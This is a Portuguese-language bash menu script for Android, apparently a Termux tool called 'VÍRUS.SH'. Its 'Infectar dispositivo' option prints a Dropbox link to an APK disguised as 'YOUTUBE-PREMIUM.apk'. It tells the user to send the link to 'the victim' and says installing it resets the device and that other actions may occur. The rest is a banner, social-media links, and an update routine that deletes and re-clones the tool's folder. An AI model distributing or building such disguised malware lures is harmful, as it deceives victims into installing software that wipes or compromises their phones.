#!/bin/bash
# Ferramenta por Spider⁷

# Paleta de Cores
purple="\e[95m"
red="\e[91m"
rset="\e[0m"
grn="\e[92m"
ylo="\e[93m"
blue="\e[94m"
cyan="\e[96m"
white="\e[97m"

banner(){
    clear
    echo -e "${purple}
                         __    _
                    _wr\"\"        \"-q__
                 _dP                 9m_
               _#P                     9#_
              d#@                       9#m
             d##                         ###
            J###                         ###L
            {###K                       J###K
            ]####K      ___aaa___      J####F
        __gmM######_  w#P\"\"   \"\"9#m  _d#####Mmw__
     _g##############mZ_         __g##############m_
   _d####M@PPPP@@M#######Mmp gm#########@@PPP9@M####m_
  a###\"\"          ,Z\"#####@\" '######\"\\g          \"\"M##m
 J#@\"             0L  \"*##     ##@\"  J#              *#K
 #\"               \`#    \"_gmwgm_~    dF               \`#_
7F                 \"#_   ]#####F   _dK                 JE
]                    *m__ ##### __g@\"                   F
                       \"PJ#####LP\"
 \`                       0######_                      '
                       _0########_
     .               _d#####^#####m__              ,
      \"*w_________am#####P\"   ~9#####mw_________w*\"
          \"\"9@#####@M\"\"           \"\"P@#####@M\"\"
${rset}"
    echo " "
    echo -e "$red             ─────▶ Criado por$grn Spider⁷$red ◀─────$rset"
    echo -e "$red            ─────▶ Github:$ylo Mtx-rng$red ◀─────$rset"
    echo
    echo -e "$cyan               [MENU PRINCIPAL - VÍRUS.SH]"
    echo
}

menu(){
    echo -e "$grn───────────────────────────────"
    echo -e "$white     [OPÇÕES DISPONÍVEIS]"
    echo -e "$grn───────────────────────────────$rset"
    echo -e "$red ➡$cyan [1] Infectar dispositivo"
    echo -e "$red ➡$cyan [2] Sobre a ferramenta"
    echo -e "$red ➡$cyan [3] Atualizar script"
    echo -e "$red ➡$cyan [4] Github Spider⁷"
    echo -e "$red ➡$cyan [5] Grupo Telegram"
    echo -e "$red ➡$cyan [6] Canal WhatsApp"
    echo -e "$red ➡$cyan [7] Sair"
    echo
    echo -ne "${blue}Escolha uma opção [1-7]: ${rset}"
    read optnz
    case "$optnz" in
        1) virus ;;
        2) about ;;
        3) upd ;;
        4) am start -a android.intent.action.VIEW -d https://github.com/Mtx-rng > /dev/null 2>&1; banner; menu ;;
        5) am start -a android.intent.action.VIEW -d https://t.me/+5LSXayniCSZkNDQ5 > /dev/null 2>&1; banner; menu ;;
        6) am start -a android.intent.action.VIEW -d https://whatsapp.com/channel/0029VbBM6llAe5VsZcTWS03s > /dev/null 2>&1; banner; menu ;;
        7) echo -e "$red Saindo...$rset"; exit 0 ;;
        *) echo -e "$red Opção inválida!$rset"; sleep 1; banner; menu ;;
    esac
}

virus(){
    clear
    echo -e "${red}"
    echo "╔═════════════════════════════════════════════════╗"
    echo "║           ALERTA DE INSTALAÇÃO - VÍRUS.SH        ║"
    echo "╚═════════════════════════════════════════════════╝"
    echo -e "${rset}"
    echo
    echo -e "${white}Copie o link abaixo e envie para a vítima."
    echo -e "${white}Ao instalar, o aparelho será resetado e outras ações podem ocorrer."
    echo
    echo -e "${grn}LINK:${cyan} https://www.dropbox.com/scl/fi/w76kw3gyerpm3ipo37qte/YOUTUBE-PREMIUM.apk?rlkey=w23zf4luijt5uys8xg4zw29no&st=af9hfuiy&dl=0${rset}"
    echo
    echo -e "${red}Use por sua conta e risco. Responsabilidade total do usuário.${rset}"
    echo
    echo -ne "${blue}Digite 'voltar' para retornar ao menu: ${rset}"
    read exitz
    if [ "$exitz" = "voltar" ]; then
        banner
        menu
    else
        banner
        menu
    fi
}

about(){
    clear
    echo -e "${purple}"
    echo "╔═════════════════════════════════════════════════╗"
    echo "║                SOBRE O VÍRUS.SH                ║"
    echo "╚═════════════════════════════════════════════════╝"
    echo -e "${rset}"
    echo
    echo -e "${white}Ferramenta bruta, desenvolvida por Spider⁷."
    echo -e "${white}Para uso avançado e com total responsabilidade."
    echo -e "${white}Github: https://github.com/Mtx-rng"
    echo -e "${white}Telegram: https://t.me/+5LSXayniCSZkNDQ5"
    echo -e "${white}WhatsApp: https://whatsapp.com/channel/0029VbBM6llAe5VsZcTWS03s"
    echo
    sleep 3
    banner
    menu
}

upd(){
    clear
    echo -e "${cyan}Iniciando atualização do script...${rset}"
    if [ -d "$HOME/virus" ]; then
        cd $HOME
        rm -rf virus
    elif [ -d "$HOME/Virus" ]; then
        cd $HOME
        rm -rf Virus
    fi
    cd $HOME
    sleep 1
    echo -e "${white}Baixando última versão do repositório...${rset}"
    printf "${cyan}["
    while git clone https://github.com/Mtx-rng/virus 2> /dev/null; do
        printf  "${grn}▓▓▓▓▓▓▓▓▓▓▓▓▓${rset}"
        sleep 1
    done
    printf "${cyan}]${rset}\n"
    echo -e "${green}Atualização concluída!${rset}"
    sleep 2
    cd $HOME
    cd virus
    bash vírus.sh
}

banner
menu
